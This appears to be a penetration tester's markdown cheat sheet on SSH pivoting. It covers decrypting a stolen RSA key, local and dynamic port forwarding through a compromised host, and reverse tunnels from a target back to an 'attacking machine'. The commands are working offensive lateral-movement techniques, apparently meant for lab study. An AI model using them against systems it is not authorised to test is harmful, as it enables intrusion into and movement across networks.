# Decrypt ssh key

```bash
openssl rsa -in hype_key_encrypted -out hype_key_decrypted
```
# Pivoting with ssh konami 

https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/

# SSH tunneling


1. Port forwarding is accomplished with the -L

*using this command will allow us to create a link to a local port*
e.g.
If we have a webserver we want to connect to on 172.16.0.10 and we have ssh access on 172.16.0.5 we can use the following command to gain access on webserver on .10 through .5 with ssh tunneling 

```
ssh -L 8000:172.16.0.10:80 (our port that we want the webserver to be at  - the webserver ip - the webserver port) user@172.16.0.5 -fN (SSH connection with the user we got )
```
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine by going to localhost:8000


3. Proxies are made using the -D switch, for example: -D 1337
   This will open port 1337 on our machine that we will send data through and we can combine it with proxychains 
  ```
   ssh -D 1337 user@172.16.0.5 -fN
```


# Reverse Connections

First we generate ssh key using ssh-keygen
then we add the pub key to ~/.ssh/authorized_keys
and add command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty before it to  disallow the ability to gain a shell on your attacking machine
```
ssh-keygen
./key
nano ~/.ssh/authorized_keys
command:"echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
PUBLIC KEY HERE
save
sudo systemctl status ssh
sudo systemctl start ssh
```
then we send our priv key to the target and connect back to use that we should destroy the key after we are done
we can do port forwarding using 

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN

or we can use the newer ssh version to reverse proxy using
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

```

to kill the connection after we are done we can use 
```
ps aux | grep ssh
sudo kill PID
```
